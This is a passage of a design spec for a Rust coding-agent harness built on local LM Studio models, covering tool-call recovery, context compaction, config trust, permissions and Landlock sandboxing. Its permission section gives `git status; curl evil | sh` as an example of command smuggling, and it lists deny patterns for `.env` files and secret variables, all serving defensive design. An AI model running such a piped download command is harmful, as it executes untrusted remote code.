@@ -1,0 +1,931 @@
+# Implementation spec
+
+The contract for implementing agents. Why the project exists is in [ROADMAP.md](../ROADMAP.md); the order of work is in [TASKS.md](TASKS.md).
+
+> [!NOTE]
+> **Evidence labels:** external facts were checked on 2026-11-06 unless marked `UNVERIFIED`, which means from memory or inferred. Confirm those against the live server or docs.rs before relying on them, and correct this file.
+>
+> **Rust signatures** show intent; names may change, invariants may not.
+>
+> **Numeric defaults** such as budget percentages and limits are starting points to be tuned through evals, and they all live in config.
+
+**Contents**
+
+| Foundations | Agent | Safety and config | Integrations |
+|---|---|---|---|
+| [1. Goals](#1-goals) | [4. Core model](#4-core-model) | [8. Config, trust, sessions](#8-config-trust-and-sessions) | [11. Front ends](#11-front-ends) |
+| [2. Performance](#2-performance) | [5. Provider](#5-provider) | [9. Permissions, sandbox](#9-permissions-and-sandbox) | [12. Plugins](#12-plugins) |
+| [3. Workspace](#3-workspace) | [6. Tools](#6-tools) | [10. Security invariants](#10-security-invariants) | [13. MCP](#13-mcp) |
+| [14. Testing](#14-testing) | [7. Context management](#7-context-management) | [15. Errors, logging](#15-error-and-logging-policy) | [16. Sources](#16-sources) |
+
+## 1. Goals
+
+In priority order:
+
+1. **Reliable on local models.** Task success on small context windows and imperfect tool calling.
+2. **Safe by construction.** Permissions and sandboxing hold even if the model is compromised.
+3. **Fast.** See §2.
+4. **Compatible.** MCP, ACP and Claude Code's plugin layout work unmodified where supported.
+
+Out of scope: hosting models, any model backend other than LM Studio, helper models for compression or tool calling (one GPU, see [RESEARCH.md](RESEARCH.md)), plugin marketplace, RAG, parallel subagents, telemetry, Windows and macOS sandboxing.
+
+## 2. Performance
+
+Inference dominates wall-clock time, so the priorities are:
+
+1. **Avoid prompt reprocessing.** Keep the prefix stable (§7). This is the largest latency lever by far.
+2. **Send fewer tokens.** Budgets, truncation, repo map.
+3. **Harness overhead.** Targets below.
+
+| Metric | Target | Measured by |
+|---|---|---|
+| `harness --version` cold start | < 20 ms | T7.2 |
+| Ready for input, no MCP servers | < 100 ms | T7.2 |
+| Ready for input with MCP servers | Same: servers connect in the background | T7.2 |
+| Idle RSS, excluding servers | < 30 MB | T7.2 |
+| Stream chunk to emitted event | < 1 ms | T7.2 |
+
+These targets are initial estimates; adjust them if measurements show they are wrong.
+
+Release profile: `lto = "fat"`, `codegen-units = 1`, `strip = true`. Keep `panic = "unwind"` so a panicking tool task becomes a tool error rather than killing the session.
+
+Don't add custom allocators, arenas or `unsafe` optimisations without a benchmark showing a problem.
+
+## 3. Workspace
+
+```
+Cargo.toml                 workspace, shared lints, release profile
+crates/
+  harness-core/            library: everything below except front ends
+    src/
+      provider/            mod.rs, chat.rs, admin.rs, stream.rs
+      agent/               loop, events, recovery
+      context/             budget, compaction, repo map
+      tools/               builtin tools, registry
+      permissions/         rules, modes, sandbox policy
+      config/              layers, trust
+      session/             JSONL log, checkpoints
+      mcp/                 rmcp client wrapper
+      plugins/             discovery, skills, commands, agents, hooks
+  harness-cli/             binary `harness`: CLI, REPL, `acp`, `sandbox-exec`
+  harness-vscode/          wasm32 cdylib: extension host side
+  harness-vscode-ui/       wasm32: webview UI
+editors/vscode/            package.json, webview HTML shell, CSS
+xtask/                     vsix packaging, eval runner
+evals/                     task definitions, fixture repos
+```
+
+The wasm crates aren't default workspace members, so `cargo test` stays native.
+
+```mermaid
+flowchart TB
+    cli["harness-cli<br/>native binary"] -->|"links"| core["harness-core<br/>library"]
+    vscode["harness-vscode<br/>wasm32"] -.->|"spawns harness acp"| cli
+    vscode <-.->|"postMessage"| ui["harness-vscode-ui<br/>wasm32"]
+    xtask["xtask<br/>dev only"] -.->|"packages"| vscode
+    xtask -.->|"runs evals through"| cli
+
+    classDef native fill:#dbeafe,stroke:#2563eb,color:#1e3a8a
+    classDef wasm fill:#fef3c7,stroke:#d97706,color:#78350f
+    classDef dev fill:#f3f4f6,stroke:#6b7280,color:#111827
+    class cli,core native
+    class vscode,ui wasm
+    class xtask dev
+```
+
+Solid lines are compile-time links. Dashed lines happen at run or build time.
+
+### Allowed dependencies
+
+Verified latest versions on 2026-11-06. Use the current compatible release at T0.1 and commit `Cargo.lock`. Anything else needs human approval.
+
+| Crate | Version | Used for |
+|---|---|---|
+| `tokio` | 1.54 | Runtime (multi-thread) |
+| `tokio-util` | 0.7 | `CancellationToken` |
+| `futures` | 0.3 | Stream combinators |
+| `reqwest` | 0.13 | HTTP, features `stream`, `json`; rustls TLS |
+| `serde`, `serde_json` | 1 | Serialization |
+| `toml` | 1.2 | Config |
+| `schemars` | 1.2 | Tool schemas from Rust types |
+| `jsonschema` | 0.60 | Validating tool arguments |
+| `clap` | 4.6 | CLI |
+| `tracing`, `tracing-subscriber` | 0.1, 0.3 | Logging to stderr (`tracing-subscriber` version `UNVERIFIED`) |
+| `thiserror` / `anyhow` | 2 / 1 | Core errors / CLI top level |
+| `rmcp` | 3.9 | MCP client; `default-features = false`, features `client`, `transport-child-process`, `transport-streamable-http-client-reqwest` |
+| `agent-client-protocol` | 5.0 | ACP v1, feature `stdio`. Don't enable `unstable_protocol_v2` |
+| `ignore`, `globset` | 0.4 | `.gitignore`-aware walking, Glob |
+| `grep-searcher`, `grep-regex` | 0.1 | Grep tool |
+| `regex` | 1.13 | Hook matchers, permission rules |
+| `similar` | 3.2 | Diffs for review |
+| `directories` | 6 | XDG paths |
+| `sha2` | 0.11 | Trust hashes |
+| `landlock` | 0.4 | Sandbox |
+| `tree-sitter` + grammar crates | 0.27 | Repo map |
+| `wasm-bindgen`, `js-sys`, `web-sys`, `wasm-bindgen-futures` | Pin to the installed CLI | Extension |
+| `leptos` (CSR) | 0.8 | Webview UI, confirmed by T0.6 |
+| `pulldown-cmark` | 0.13 | Markdown in the webview |
+| `zip` | 9.4 | `.vsix` (xtask only) |
+| `wiremock` | 0.6 | Dev: fake provider server |
+| `ratatui` | 0.30 | Only if T7.3 is approved |
+
+No SSE crate: `eventsource-stream` hasn't been updated since 2022, and line parsing is short. No tokenizer crate: see §7.
+
+## 4. Core model
+
+Front ends only ever see these events and send these commands. This boundary is what keeps ACP replaceable.
+
+```rust
+pub enum AgentEvent {
+    TextDelta(String),
+    ThinkingDelta(String),
+    ToolStarted { id: ToolCallId, name: String, input: serde_json::Value, title: String },
+    ToolFinished { id: ToolCallId, outcome: ToolOutcome },
+    PermissionRequest { id: ToolCallId, name: String, input: serde_json::Value,
+                        preview: Option<Preview>, respond: oneshot::Sender<PermissionReply> },
+    Usage { used_tokens: u32, context_size: u32, cached_tokens: Option<u32> },
+    Compaction(CompactionState),
+    Notice { severity: Severity, title: String, detail: Option<String> },
+    TurnEnded(StopReason),
+}
+
+pub enum StopReason { EndTurn, MaxTokens, MaxTurnRequests, Cancelled, LoopDetected, ProviderError }
+
+pub enum PermissionReply { AllowOnce, AllowAlways, RejectOnce, RejectAlways, Cancelled }
+```
+
+The agent loop runs as one Tokio task per session, sends events on an `mpsc` channel, and observes a `CancellationToken`. Handlers must be `Send`, which ACP also requires.
+
+Map to ACP stop reasons (§11): `LoopDetected` becomes `end_turn` plus a warning `notice`, and `ProviderError` becomes a JSON-RPC error on the prompt.
+
+### Loop
+
+```mermaid
+flowchart TD
+    turn(["User prompt"]) --> prompt["Assemble prompt (§7)"]
+    prompt --> request["Call LM Studio<br/>stream and emit deltas"]
+    request --> parse["Parse and recover tool calls (§5.3)"]
+    parse --> any{{"Any tool calls?"}}
+    any -->|"No"| done(["TurnEnded: EndTurn"])
+    any -->|"Yes"| pre
+
+    pre["For each call, in order:<br/>PreToolUse hooks"] --> check{{"Permission check (§9)"}}
+    check -->|"Allowed"| run["Execute<br/>sandboxed if Bash"]
+    run --> post["PostToolUse hooks"]
+    post --> budget["Budget the result (§7)<br/>append to session"]
+    check -->|"Denied: error to the model"| budget
+
+    budget --> loopcheck{{"Loop detected? (§5.4)"}}
+    loopcheck -->|"Yes"| stuck(["TurnEnded: LoopDetected"])
+    loopcheck -->|"No"| compact["Compaction check (§7)"]
+    compact --> limit{{"max_turn_requests reached?"}}
+    limit -->|"Yes"| capped(["TurnEnded: MaxTurnRequests"])
+    limit -->|"No: next request"| prompt
+
+    classDef stop fill:#f3f4f6,stroke:#6b7280,color:#111827
+    classDef decide fill:#fef3c7,stroke:#d97706,color:#78350f
+    classDef begin fill:#dbeafe,stroke:#2563eb,color:#1e3a8a
+    class done,stuck,capped stop
+    class turn begin
+    class any,check,loopcheck,limit decide
+```
+
+A cancel or provider failure can end the turn at any step, giving `TurnEnded(Cancelled)` or `TurnEnded(ProviderError)`.
+
+Tool calls run sequentially. Local servers process requests serially, and ordering keeps the logs and permission prompts understandable. Cap at `max_turn_requests` (default 50).
+
+## 5. Provider
+
+### 5.1 Shape
+
+```rust
+pub struct Provider { chat: ChatClient, admin: AdminClient }
+
+impl Provider {
+    pub async fn chat(&self, req: ChatRequest, cancel: CancellationToken)
+        -> Result<impl Stream<Item = Result<ChatChunk, ProviderError>>, ProviderError>;
+    pub async fn list_models(&self) -> Result<Vec<ModelInfo>, ProviderError>;
+    pub async fn ensure_ready(&self, model: &str, context: u32) -> Result<ReadyModel, ProviderError>;
+}
+```
+
+LM Studio is the only backend. Chat goes through its OpenAI-compatible route and model management through its native API. No provider trait or enum: tests go through HTTP against the fake server, so nothing needs a mock.
+
+- **Base URL:** LM Studio `http://localhost:1234` (the port in its docs' examples; `UNVERIFIED` as the default).
+- **Proxies:** call `.no_proxy()` on loopback clients.
+- **Remote URLs:** warn when a non-loopback URL uses plain `http://`.
+- **Keys:** `api_key_env` in config names an environment variable. Keys are never stored in config or logged.
+- **Errors:** connection refused, no model loaded and unsupported tools each get a distinct `ProviderError` with a message that tells the user what to do.
+
+### 5.2 LM Studio facts
+
+**LM Studio: chat through `/v1/chat/completions`, manage through `/api/v1/*`.** Native `/api/v1/chat` doesn't accept custom tools or client-supplied assistant messages.
+
+| Item | Fact |
+|---|---|
+| Stream | OpenAI SSE |
+| Context | `POST /api/v1/models/load` with `context_length`; with `echo_load_config: true`, the response's `load_config` shows what was applied |
+| Model list | `GET /api/v1/models`: `key`, `max_context_length`, `loaded_instances[].{id, config.context_length}`, `capabilities.trained_for_tool_use` |
+| Unload | `POST /api/v1/models/unload` |
+| Auth | Optional `Authorization: Bearer` |
+| `UNVERIFIED` | Whether `/v1/chat/completions` uses a specific instance by id; `usage` and cached-token fields in streams; a reasoning field in deltas |
+
+**`ensure_ready` behaviour.** A reload would disrupt anything else using the server, so it only happens with consent:
+
+```mermaid
+flowchart TD
+    start["ensure_ready(model, context)"] --> exists{{"Model known to LM Studio?"}}
+    exists -->|"No"| missing(["ProviderError: model not found"])
+    exists -->|"Yes"| loaded{{"Loaded instance with<br/>enough context?"}}
+    loaded -->|"Yes"| ready(["Use that instance"])
+    loaded -->|"No"| auto{{"auto_load = true?"}}
+    auto -->|"Yes"| load["POST /api/v1/models/load<br/>with context_length"]
+    auto -->|"No"| ask{{"Notice: ask the user"}}
+    ask -->|"Approved"| load
+    ask -->|"Declined"| stop(["Stop and explain"])
+    load --> ready
+
+    classDef good fill:#dcfce7,stroke:#16a34a,color:#14532d
+    classDef bad fill:#fee2e2,stroke:#dc2626,color:#7f1d1d
+    class ready good
+    class missing,stop bad
+```
+
+### 5.3 Tool-call recovery
+
+Weak models are the core problem here.
+
+```mermaid
+flowchart TD
+    reply["Assistant output"] --> native{{"Native tool_calls?"}}
+    native -->|"Yes"| repair
+    native -->|"No"| text{{"Text-embedded call?<br/>parsers from the profile"}}
+    text -->|"No"| plain(["Plain reply: no tool call"])
+    text -->|"Yes"| repair["JSON repair"]
+    repair --> valid{{"Valid against<br/>the tool's schema?"}}
+    valid -->|"Yes"| perm(["Same permission path as any call"])
+    valid -->|"No"| error["Structured tool error<br/>returned to the model"]
+    error --> count{{"3 failures in a row<br/>for this call?"}}
+    count -->|"No"| retry(["Model retries,<br/>constrained if supported"])
+    count -->|"Yes"| halt(["Stop with a notice"])
+
+    classDef good fill:#dcfce7,stroke:#16a34a,color:#14532d
+    classDef bad fill:#fee2e2,stroke:#dc2626,color:#7f1d1d
+    class perm good
+    class halt bad
+```
+
+Stages, in order:
+
+1. **Native** `tool_calls` from the response.
+2. **Text-embedded calls**, only in the assistant's own output, using parsers selected by the model profile (`<tool_call>{json}</tool_call>` and whichever formats T2.2's recordings show).
+3. **JSON repair:** double-encoded argument strings, trailing commas, code fences, literal newlines in strings.
+4. **Schema validation** with `jsonschema` against the tool's input schema.
+5. **On failure,** return a structured tool error to the model naming the problem and the expected shape. Allow up to 3 failures for the same call in a row, then stop with a notice.
+6. **Constrained retry (T2.12).** If T0.3 shows it works, the retry uses LM Studio's `response_format` JSON schema, which uses grammar sampling on GGUF models. This fixes structure only, so validation and permission checks still apply. LM Studio warns that not all models support structured output, especially those under 7B.
+
+Rules:
+
+- Never parse tool calls out of tool results. Recovered calls go through the same permission path as native ones.
+- Never execute a call that failed validation.
+- Strip reasoning (`<think>` blocks or a reasoning field) before storing the assistant message, so history stays compact and stable. Still emit it as `ThinkingDelta`.
+- Record parse failures for the scoreboard.
+
+### 5.4 Loop detection
+
+Stop with `LoopDetected` when any of these happen:
+
+- The same tool and arguments occur 3 times in a row.
+- The same tool and arguments occur 5 times within the last 20 calls.
+- There are 10 consecutive read-only calls with an empty assistant message and no new files read.
+
+### 5.5 Model profiles
+
+Layered: built-in by name pattern, then capabilities reported by LM Studio, then user config.
+
+```toml
+[profiles."qwen*"]
+context = 64000
+max_output = 8192
+tool_format = "native"        # native | hermes-text | ...
+temperature = 0.2
+stop = []
+strip_thinking = true
+```
+
+A model reporting no tool support gets a warning, then text-embedded calling with the format described in the system prompt.
+
+## 6. Tools
+
+**Names and parameters match Claude Code exactly** because plugin hooks match on them (`"matcher": "Write|Edit"`) and read `tool_input.file_path`. Changing them breaks plugin compatibility.
+
+| Tool | Parameters | Default permission |
+|---|---|---|
+| `Read` | `file_path`, `offset?`, `limit?` | allow in workspace |
+| `Write` | `file_path`, `content` | ask |
+| `Edit` | `file_path`, `old_string`, `new_string`, `replace_all?` | ask |
+| `Bash` | `command`, `description?`, `timeout?` (ms) | ask, sandboxed |
+| `Grep` | `pattern`, `path?`, `glob?`, `output_mode?`, `-i?`, `multiline?` | allow in workspace |
+| `Glob` | `pattern`, `path?` | allow in workspace |
+
+Later additions: `RepoMap` (T2.8), `Skill` (T6.2), `ToolSearch` and `CallTool` (T4.4).
+
+```rust
+pub struct ToolOutput { pub content: String, pub is_error: bool, pub structured: serde_json::Value }
+```
+
+`structured` is what `PostToolUse` hooks receive as `tool_response`: `Write` gives `filePath`, `type`; `Bash` gives `stdout`, `stderr`, `interrupted`, `isImage`.
+
+Behaviour:
+
+- **Paths** are absolute in `tool_input`. Resolve relative paths against the workspace before hooks see them.
+- **`Edit`** fails if `old_string` is missing or, without `replace_all`, not unique. Say which, and include a near match if one exists, since weak models often get whitespace wrong. Require the file to have been read earlier in the session, and refuse if it changed since that read, so a developer's concurrent edit is never overwritten.
+- **`Write` and `Edit` results** stay short (path and lines changed) and never repeat file content to the model. Hooks still receive the full `structured` value.
+- **`Write` and `Edit`** write through a temp file and atomic rename, and preserve file mode. Checkpoint first (§8).
+- **`Read`** returns line-numbered text, refuses binary files, and applies a default line limit. Never filter or minify its content, because `Edit` needs an exact match.
+- **`Bash`** runs through `harness sandbox-exec` (§9), kills the whole process group on timeout or cancel, and has a default timeout of 120 s.
+- **Tool errors** are returned to the model as content. They never end the turn.
+
+## 7. Context management
+
+### Prompt layout
+
+Everything before the history must stay **byte-identical** for the whole session.
+
+```mermaid
+flowchart TB
+    tools["tools param<br/>fixed at session start"] -.-> prefix
+
+    subgraph prefix["Prefix: byte-identical all session"]
+        direction LR
+        system["System prompt"] --> agents["AGENTS.md"] --> skills["Skill index"] --> facts["Frozen session facts"]
+    end
+
+    subgraph growing["Append-only"]
+        history["History"]
+    end
+
+    prefix --> growing
+
+    classDef fixed fill:#dbeafe,stroke:#2563eb,color:#1e3a8a
+    classDef grows fill:#dcfce7,stroke:#16a34a,color:#14532d
+    class tools,system,agents,skills,facts fixed
+    class history grows
+```
+
+- Date, cwd, branch and OS are captured once at session start. If they change, append a message; never rewrite the prefix.
+- Serialize tools and JSON deterministically, with stable key order.
+- **Don't change the `tools` array mid-session.** It's rendered into the start of the prompt by chat templates (`UNVERIFIED` per model), so changing it invalidates the cache.
+- Rewrite old messages only in a compaction pass. Filter and truncate tool output once, when first recorded.
+- Log cached prompt tokens if LM Studio reports them (`UNVERIFIED`), otherwise time to first token. A regression test (T2.5) asserts that consecutive request bodies share a prefix.
+
+### Token budget
+
+Default allocation of the context window `C`:
+
+| Category | Limit |
+|---|---|
+| Reserved for output | 15% of `C` |
+| System prompt, tools, AGENTS.md, skill index | 25% of `C`; warn and trim AGENTS.md first when over |
+| One tool result | 10% of `C` |
+| History | Whatever remains; compact at 80% of `C` |
+
+**Counting:** no tokenizer dependency, because tokenizers vary by model and the server knows the truth. Estimate at `chars / 3.5`, then calibrate per session from the `usage` the server reports. Compact early when uncertain.
+
+**Oversized tool results:** keep head and tail, write the full text to the session's spool directory, and tell the model the path and how to read more.
+
+**Truncation detection:** servers may silently drop the start of an oversized prompt. Before each request, check the estimate against `C`. After each response, compare the reported prompt tokens with the estimate; a value far below the estimate, or at the context size, emits a warning and forces compaction. Exact thresholds come from T0.3.
+
+### Compaction
+
+Every rewrite of history discards the server's cache from that point on, so compaction is rare, batched and tiered, with the cheapest stage first. Evidence and the conflict behind this design are in [RESEARCH.md](RESEARCH.md#the-conflict).
+
+```mermaid
+flowchart TD
+    check{{"History above 80% of C?"}} -->|"No"| keep(["Append only:<br/>no rewrite"])
+    check -->|"Yes"| mask["Stage 1: mask the oldest tool outputs<br/>down to 60% of C, one batched rewrite"]
+    mask --> enough{{"At or below 70% of C?"}}
+    enough -->|"Yes"| done(["Continue"])
+    enough -->|"No"| summary["Stage 2: summarise older history<br/>with the same model"]
+    summary --> ok{{"Summary fits and succeeded?"}}
+    ok -->|"Yes"| done
+    ok -->|"No"| stubs["Stage 3: reduce the oldest results<br/>to stubs and warn"]
+    stubs --> done
+
+    classDef good fill:#dcfce7,stroke:#16a34a,color:#14532d
+    classDef decide fill:#fef3c7,stroke:#d97706,color:#78350f
+    class keep,done good
+    class check,enough,ok decide
+```
+
+**Masking rules:**
+- Mask whole tool results, never individual tokens or lines. Assistant text and tool calls stay.
+- Always keep the most recent `mask_keep_turns` turns (default 10), or as many as fit. Never mask a result the model hasn't had a turn to use.
+- The placeholder names the tool, its arguments and how to get the output again, such as `[Output removed to save space: Read src/a.rs lines 1-200. Call it again if needed.]`.
+- The window size needs tuning, so evals compare 5, 10 and 20 against no masking. Small models may be more sensitive.
+
+**Summaries** use a structured template: goal, decisions, files changed, current state, next step. New history is `[summary] + [last N turns]`.
+
+Every stage leaves the prefix before history untouched, emits `Compaction` events and records the boundary in the session log. The full log stays on disk.
+
+### Reducing tool output
+
+Applied once, when a result is first recorded, so they never rewrite history. These are Should tasks and stay only if evals show no drop in success.
+
+**Output filters (T2.11)** are rule-based. The complete output always stays in the spool directory, and they can be turned off with `filter_output = false`.
+
+| Removed | Always kept |
+|---|---|
+| ANSI codes, progress bars, carriage-return overwrites | Exit codes |
+| Consecutive repeated lines, replaced by a count | Every failing test, with its full output |
+| Per-test pass lines, when the run has a summary | Errors, warnings and stack traces |
+| `make` enter and leave directory lines | Anything from `Read`, which is never filtered |
+
+**Repeat reads (T2.10)** of an unchanged range return a stub: `Unchanged since turn N.` If that earlier output has been masked, or the file has changed, return the content in full. If a file the model has read changes outside the agent, append a one-line notice saying so.
+
+### Tools at scale
+
+MCP servers can exceed a small window on tool schemas alone. Decide once, at session start:
+
+- Total schema size ≤ 10% of `C`: **direct** mode, with each tool in `tools`.
+- Otherwise: **indexed** mode. `tools` holds only the built-ins plus `ToolSearch` (returns matching schemas as text) and `CallTool` (`{name, arguments}`), and the prompt lists names with one-line descriptions.
+
+In indexed mode, permissions, hooks and logs act on the **inner** tool name, never `CallTool`, and arguments are validated against the inner schema.
+
+### Repo map
+
+Tree-sitter extracts symbols (file, signature, line). Respect `.gitignore`, cache by mtime, and fit a byte budget, preferring files near recent edits. It's exposed as a tool so the prefix stays stable. Start with Rust, Python, TypeScript, Go and C/C++.
+
+## 8. Config, trust and sessions
+
+### Layers
+
+```mermaid
+flowchart LR
+    defaults["Defaults"] --> user["User"]
+    user --> project["Project"]
+    project --> env["Env"]
+    env --> flags["Flags"]
+    flags --> final(["Effective config"])
+
+    classDef untrusted fill:#fef3c7,stroke:#d97706,color:#78350f
+    classDef result fill:#dcfce7,stroke:#16a34a,color:#14532d
+    class project untrusted
+    class final result
+```
+
+Layers: built-in defaults, user `~/.config/harness/config.toml`, project `.harness/config.toml`, environment `HARNESS_*`, CLI flags. Later layers win. Lists of permission rules merge; scalars replace. Errors name the file, key and problem. Unknown keys are errors. The project layer is untrusted and passes through the trust gate below.
+
+```toml
+default_model = "your-model"
+
+[lmstudio]
+base_url = "http://localhost:1234"
+api_key_env = "LM_API_TOKEN"      # optional; names the variable holding the token
+
+[agent]
+max_turn_requests = 50
+auto_load = false
+
+[context]
+mask_keep_turns = 10
+filter_output = true
+
+[permissions]
+mode = "ask"                      # read-only | ask | auto-edit
+allow = ["Bash(cargo test*)"]
+deny = ["Read(**/.env*)"]
+
+[sandbox]
+mode = "on"                       # on | off
+network = false
+extra_write = []
+extra_read = []
+
+[mcp.filesystem]
+command = "mcp-server-filesystem"
+args = ["."]
+```
+
+Project MCP servers may also come from `.mcp.json` in Claude Code's shape, with or without the `mcpServers` wrapper.
+
+### Trust
+
+> [!WARNING]
+> A cloned repository is hostile until approved. **Project config can always narrow, but needs approval to widen.**
+
+```mermaid
+flowchart TD
+    item["Project config item"] --> never{{"lmstudio.* or sandbox.*?"}}
+    never -->|"Yes"| ignored(["Never honoured"])
+    never -->|"No"| narrows{{"Narrows, or only<br/>chooses a model?"}}
+    narrows -->|"Yes"| applied(["Applied"])
+    narrows -->|"No: widens"| hash{{"Stored approval matches<br/>its SHA-256?"}}
+    hash -->|"Yes"| applied
+    hash -->|"No"| ask{{"User approves?<br/>Non-interactive means no"}}
+    ask -->|"Yes: store the hash"| applied
+    ask -->|"No"| inactive(["Stays inactive, with a notice"])
+
+    classDef good fill:#dcfce7,stroke:#16a34a,color:#14532d
+    classDef bad fill:#fee2e2,stroke:#dc2626,color:#7f1d1d
+    class applied good
+    class ignored,inactive bad
+```
+
+| Project config item | Without approval |
+|---|---|
+| `deny` rules, model choice, stricter mode | Applied |
+| `allow` rules, wider mode | Ignored with a notice |
+| MCP servers, hooks, plugins | Not started |
+| `lmstudio.*`, `sandbox.*` | **Never honoured from project config**, even when approved |
+| `AGENTS.md` | Loaded as context; it can't grant anything |
+
+Approval stores the SHA-256 of the widening content in `~/.local/share/harness/trust.json`, per project path. Any change requires re-approval. In non-interactive mode, unapproved items stay inactive.
+
+### Sessions
+
+- `~/.local/share/harness/sessions/<id>.jsonl`: one JSON record per line, append-only, mode `0600`. Tolerate a truncated last line on load, since a crash can cause one.
+- Resume rebuilds history from the log.
+- Before any `Write` or `Edit`, save the original in `<id>/checkpoints/`. `/undo` restores the last turn's files. Bash side effects can't be undone, and the UI must say so.
+- Sessions contain source code and tool output. They never leave the machine.
+
+## 9. Permissions and sandbox
+
+### Decision order
+
+For each tool call, the first match from the top wins:
+
+```mermaid
+flowchart TD
+    toolcall["Tool call"] --> hookdeny{{"PreToolUse hook denies<br/>or exits 2?"}}
+    hookdeny -->|"Yes"| deny(["Deny"])
+    hookdeny -->|"No"| rule{{"Matches a deny rule?"}}
+    rule -->|"Yes"| deny
+    rule -->|"No"| hard{{"Hard denial (§10), or<br/>denied by read-only mode?"}}
+    hard -->|"Yes"| deny
+    hard -->|"No"| hookask{{"PreToolUse hook says ask?"}}
+    hookask -->|"Yes"| ask
+    hookask -->|"No"| grant{{"Allow rule, session grant<br/>or hook allow?"}}
+    grant -->|"Yes"| allow(["Allow"])
+    grant -->|"No"| mode{{"Mode default<br/>table below"}}
+    mode -->|"allow"| allow
+    mode -->|"ask"| ask{{"Ask the user"}}
+    ask -->|"Approved"| allow
+    ask -->|"Rejected or unreachable"| deny
+
+    classDef good fill:#dcfce7,stroke:#16a34a,color:#14532d
+    classDef bad fill:#fee2e2,stroke:#dc2626,color:#7f1d1d
+    classDef prompt fill:#fef3c7,stroke:#d97706,color:#78350f
+    class allow good
+    class deny bad
+    class ask prompt
+```
+
+`read-only` mode's denials are checked before allow rules, so an allow rule can't widen that mode.
+
+| Mode | Read-only tools | `Write`, `Edit` | `Bash`, MCP |
+|---|---|---|---|
+| `read-only` | allow | deny | deny |
+| `ask` | allow | ask | ask |
+| `auto-edit` | allow | allow in workspace | ask |
+
+A hook `allow` skips the prompt but can't override `deny` rules or hard denials.
+
+### Rule syntax
+
+Compatible with Claude Code's: `Tool`, `Tool(glob)`, `mcp__server__tool`. Examples: `Bash(git status*)`, `Edit(src/**)`, `Read(**/.env*)`.
+
+**`Bash` allow rules only match simple commands.** Anything containing `;`, `&`, `|`, `` ` ``, `$(`, `>`, `<`, a newline or `${` never matches an allow rule, and always asks. Otherwise `Bash(git *)` would permit `git status; curl evil | sh`. Deny rules match against the whole string and every simple segment.
+
+### Permission prompts
+
+Prompts are a limited resource, because developers' review effort falls over a session, and confirming a request isn't the same as verifying it (see [RESEARCH.md](RESEARCH.md#developers-in-the-ide)). So:
+
+- Always show the **full parameters**: the exact command, path or MCP arguments. Never only a summary.
+- Allow rules exist to remove routine prompts, so that the prompts left are worth reading.
+- Don't offer "always" for compound commands, or for anything outside the workspace.
+- Rule-based risk labels (T5.8) may direct attention, such as for CI, dependency or auth paths. Never show a "safe" label or any verdict that suggests a change was checked.
+
+### Workspace confinement
+
+Resolve with `canonicalize` on the deepest existing ancestor, so symlinks and `..` can't escape; check containment after resolution. Outside the workspace, reads ask and writes need an explicit per-path approval, except for `extra_read` and `extra_write`.
+
+### Sandbox
+
+All `Bash` commands run as `harness sandbox-exec --policy <json> -- /bin/sh -c <command>`. Using a helper avoids `pre_exec` in a multi-threaded parent, and needs no `unsafe`.
+
+```mermaid
+sequenceDiagram
+    participant H as harness
+    participant S as sandbox-exec
+    participant K as Linux kernel
+    participant C as /bin/sh -c command
+
+    H->>S: spawn with policy and scrubbed environment
+    S->>K: apply Landlock ruleset
+    K-->>S: enforcement status
+    alt Fully enforced
+        S->>C: exec, replacing the helper
+        C-->>H: output and exit code
+    else Not fully enforced
+        S-->>H: refuse and explain
+    end
+```
+
+- **Writes:** workspace, a per-session temp directory, `extra_write`.
+- **Reads:** allowlist of system directories, workspace, toolchain directories, `extra_read`. `~/.ssh` and similar stay unreadable, unlike a write-only sandbox.
+- **Network:** TCP bind and connect blocked unless `network = true`, which needs Landlock ABI 4 or later.
+- **Environment:** allowlisted variables only (`PATH`, `HOME`, `LANG`, `TERM`, toolchain variables). `*_TOKEN`, `*_KEY` and `*_SECRET` are always removed.
+- **Fail closed.** If Landlock isn't fully enforced, refuse to run commands and explain how to set `sandbox.mode = "off"` in user config. Never fall back silently.
+
+`// shortcut: Landlock doesn't restrict UDP or all socket types, so "no network" isn't absolute; add seccomp or a network namespace if this becomes a real threat.`
+
+`// shortcut: Landlock is allowlist-only and can't exclude a subdirectory of a writable tree, so an approved Bash command can still write to .git/hooks or .harness; run git with hooks disabled or mount those paths read-only in a namespace if this proves exploitable.`
+
+Because of that limit, hard denials (§10) are fully enforced for `Write` and `Edit` only. For `Bash`, they are enforced by the prompt: a command that mentions a hard-denied path never matches an allow rule, and the threat model must state the gap, including indirect writes that the text check can't see.
+
+`sandbox-exec` must be hidden from `--help`. It runs what it's told, and only applies restrictions, so it grants nothing new.
+
+MCP servers and hooks are **not** sandboxed in the first version, because they are user-approved programs that often need access. Say so in the approval prompt and threat model.
+
+## 10. Security invariants
+
+> [!CAUTION]
+> Every one needs a test. Never weaken these without human approval.
+
+1. Nothing the model outputs or reads can change permissions, config or trust.
+2. A repository can't run code or widen permissions without approval, and changed content requires re-approval.
+3. `Bash` never runs outside the sandbox unless the user turned it off in **user** config or a flag.
+4. Write and edit paths are checked after symlink resolution.
+5. **Hard denials,** even under `auto-edit`: `.git/hooks/**`, `.git/config`, `.harness/**`, `.mcp.json`, and user config. Otherwise the agent could approve itself or plant code that runs later. `Bash` has a documented limit (§9).
+6. Secrets don't appear in logs, session records or child environments. Keys are referenced by variable name.
+7. Tool output, MCP results and file contents are treated as data: never parsed for tool calls, and shown escaped in UIs.
+8. No network traffic except to the configured LM Studio server and MCP servers, and whatever the user approves.
+9. Plugins are pinned to a commit, and what they can run is shown before enabling.
+10. In the webview, model text never becomes raw HTML (§11).
+11. An MCP tool whose name, description or schema changed since approval isn't offered to the model until it's approved again (§13).
+
+## 11. Front ends
+
+### CLI
+
+```
+harness [PROMPT]             one-shot if PROMPT or stdin is given; otherwise REPL
+harness --resume [ID]        resume a session
+harness models               list models and effective context
+harness acp                  ACP agent over stdio
+harness plugin <install|list|enable|disable|remove>
+harness sandbox-exec         hidden helper
+```
+
+Flags: `--model`, `--mode`, `--config-override KEY=VALUE`. Exit codes: 0 success, 1 runtime or provider error, 2 usage or config error, 130 cancelled.
+
+Ctrl-C cancels the turn once and exits the second time. When stdout isn't a terminal, output plain text.
+
+### ACP mode
+
+Transport is stdio only: newline-delimited JSON-RPC, one message per line. stdout is protocol only, stderr is logs.
+
+Start from `Agent.v1()` with a `Stdio` transport and `Builder` handlers. Handlers, transports and connection futures must be `Send`. The crate has no worked agent example on its docs.rs front page, so read its cookbook and the repository's examples.
+
+```mermaid
+sequenceDiagram
+    participant C as Client (editor)
+    participant A as harness acp
+    participant L as LM Studio
+
+    C->>A: initialize
